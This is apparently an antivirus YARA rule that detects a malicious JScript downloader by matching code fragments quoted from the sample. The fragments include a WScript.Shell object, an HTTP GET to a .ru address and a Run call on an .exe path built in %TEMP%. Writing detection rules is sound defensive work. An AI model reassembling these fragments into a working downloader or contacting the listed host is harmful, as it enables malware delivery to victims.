rule sig_20160330_ef62235e99919d2aa56032e4a6e3201d {
  meta:
    description = "datamaliciousorder - file 20160330_ef62235e99919d2aa56032e4a6e3201d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2220e1568227d4a79de74a10a62fafdd26a3e68225ec21301f5612bc3ad0a3d6"

  strings:
    $s1  = "function JI(DG, E0){AW = AW * 1; return DG - E0;};" fullword ascii
    $s2  = "var T = function F() {return WScript[E](\"WScript\"+\".Shell\");}(), D = 11;" fullword ascii
    $s3  = "O[F0](\"GET\", \"http://buketrose.ru/h3sia\", false);" fullword ascii
    $s4  = "if (O[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SK(){return PJ + \"\";};" fullword ascii
    $s6  = "function NR() {return T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9BXaCTi303.ex\" + \"e\";};" fullword ascii
    $s7  = "function H(L){T[\"Run\"](L, AW, AW);};" fullword ascii
    $s8  = "}while (J);" fullword ascii
    $s9  = "var OJ = new this[\"Date\"]();" fullword ascii
    $s10 = "function JC(){return E;};" fullword ascii
    $s11 = "function YN()" fullword ascii
    $s12 = "function QZ(UX) {var KT = (1, 2, 3, 4, 5, UX); return KT;};" fullword ascii
    $s13 = "function UV(){return 22;};" fullword ascii
    $s14 = "return JI(HB, LE);" fullword ascii
    $s15 = "function CB() {return ((CA == true) && (CA == Y)) ? 1 : AW;};" fullword ascii
    $s16 = "Y = true; " fullword ascii
    $s17 = "var Y = false;" fullword ascii
    $s18 = "var VD = false;" fullword ascii
    $s19 = "} catch(PM){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}